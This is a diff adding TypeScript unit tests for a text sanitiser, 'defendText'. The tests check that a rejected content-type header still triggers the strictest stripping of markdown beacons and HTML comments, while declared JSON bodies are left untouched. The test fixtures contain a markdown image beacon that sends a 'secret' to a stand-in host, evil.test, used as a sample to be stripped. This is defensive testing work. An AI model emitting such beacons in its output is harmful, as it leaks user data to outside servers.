@@ -23,6 +23,48 @@ describe("defendText — the grammar selector is not omittable", () => {
     });
 });
 
+describe("defendText — a REJECTED content type selects the strictest grammar (RC-31)", () => {
+    // **Two absences keyed on different facts, and only one was consulted.**
+    // `parseResponseWithMetadata` resolves anything failing `MEDIA_TYPE_PATTERN`
+    // to `undefined`, but `contentTypeUndetermined` reports whether OUR OWN `-w`
+    // metadata block was found — and for a malformed header it was. So a
+    // rejected content type arrived here as `undefined` with the flag FALSE and
+    // took the permissive path: the strip stages that a correct header selects
+    // were switched off by malforming the header. The origin chose which.
+    const beacon = "hello ![x](https://evil.test/?d=secret) and <!--c--> end";
+
+    it("strips a markdown beacon when the type is undefined and the flag is false", () => {
+        const rejected = defendText(beacon, { ...determined, contentType: undefined });
+        expect(rejected).not.toContain("evil.test");
+        expect(rejected).not.toContain("<!--");
+    });
+
+    it("gives an undefined type the same result as an undetermined one", () => {
+        // The equality is the claim `ParsedResponse.contentType`'s docblock makes
+        // — both mean "no usable declared grammar" — asserted at the one
+        // consumer that acts on it.
+        expect(defendText(beacon, { ...determined, contentType: undefined })).toBe(
+            defendText(beacon, { contentTypeUndetermined: true, hostname: HOST })
+        );
+    });
+
+    // Teeth on the other side: the two cases above would also pass if the
+    // strictest grammar had simply been made unconditional. It has not been —
+    // a DECLARED grammar still selects its own stages.
+    it("still leaves a JSON body alone when it declares application/json", () => {
+        const jsonDoc = '{"md":"![x](https://evil.test/?d=secret)"}';
+        const out = defendText(jsonDoc, { ...determined, contentType: "application/json" });
+        expect(out).toBe(jsonDoc);
+    });
+
+    // And the JSON exemption must survive a rejected header, or the fix would
+    // start rewriting persisted JSON artefacts that merely arrived mislabelled.
+    it("keeps the JSON exemption for a JSON body whose header was rejected", () => {
+        const jsonDoc = '{"md":"![x](https://evil.test/?d=secret)"}';
+        expect(defendText(jsonDoc, { ...determined, contentType: undefined })).toBe(jsonDoc);
+    });
+});
+
 describe("defendText — a JSON document is never entity-decoded (RC-12)", () => {
     const jsonDoc = '{"q":"a &#x22;quoted&#x22; b"}';
 
